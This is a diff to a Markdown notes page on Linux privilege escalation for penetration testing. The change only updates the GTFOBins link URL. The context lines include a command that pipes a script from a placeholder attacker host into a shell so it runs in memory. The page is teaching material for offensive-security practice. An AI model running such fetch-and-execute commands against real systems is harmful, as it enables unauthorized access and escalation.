@@ -9,7 +9,7 @@ come from `sudo -l`, SUID binaries, cron/timers, writable files, or reused
 credentials. Kernel exploits are a **last resort**, not a first move — they're
 noisy, can panic the box, and are rarely the intended path.
 
-Reference kept open at all times: [GTFOBins](https://gtfobins.github.io) — the
+Reference kept open at all times: [GTFOBins](https://gtfobins.org) — the
 lookup for turning any `sudo`/SUID/capability into a shell.
 
 Related: [Initial Enumeration](./enumeration.md) · [Windows PrivEsc](./windows-privesc.md) · [Active Directory](./active-directory.md)
@@ -198,6 +198,6 @@ curl http://<ATTACKER_IP>/linpeas.sh | sh          # run in memory, no file on d
 
 ## References
 
-- [GTFOBins](https://gtfobins.github.io)
+- [GTFOBins](https://gtfobins.org)
 - [PayloadsAllTheThings — Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings)
 - [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
